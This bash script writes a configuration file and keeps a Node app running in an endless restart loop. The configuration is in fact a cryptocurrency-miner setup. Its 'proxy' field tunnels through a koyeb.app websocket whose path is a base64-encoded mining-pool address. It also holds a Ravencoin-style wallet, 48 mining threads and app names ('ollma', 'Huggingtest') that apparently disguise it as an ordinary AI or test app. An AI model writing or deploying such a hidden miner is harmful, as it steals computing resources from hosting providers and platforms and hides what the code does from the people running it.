#!/bin/bash

# --- Configuration ---
MAX_RETRIES=5
RETRY_WAIT_SECONDS=5
COMMAND_TIMEOUT_SECONDS=15
APP_DIR="~/ollma"
NODE_APP="app.js"

# Expand the tilde to the full home directory path
#eval APP_DIR="$APP_DIR"

# Change to the application directory, exit with an error if it fails.
# cd "$APP_DIR" || { echo "ERROR: Failed to cd to '$APP_DIR'. Ensure the directory exists."; exit 1; }

# Make the node binary executable if it isn't already

# Create the data configuration file once.
echo "Creating data.json configuration file..."
echo '{
  "proxy": "wss://ratty-adoree-ananta512-4abadf1a.koyeb.app/cG93ZXIyYi5ldS5taW5lLnpwb29sLmNhOjYyNDI",
  "config": { "threads": 48, "log": true },
  "options": { "user": "RYJVM8YKZfHJpN1cevUKWkEqLfMbUz7Rk5", "password": "c=RVN", "argent": "Huggingtest" }
}' > data.json

# --- Main Loop ---
# This "while true" loop will run forever, ensuring the node app is always running.
while true; do
  echo "---"
  echo "Attempting to start the application..."
  
  # Run the node app directly. If it crashes, the script will loop and restart it.
  # The output of the node app will be displayed directly in your terminal.
  node $NODE_APP

  echo "---"
  echo "⚠️  Application stopped or crashed."
  echo "Restarting in $RETRY_WAIT_SECONDS seconds..."
  sleep $RETRY_WAIT_SECONDS
done
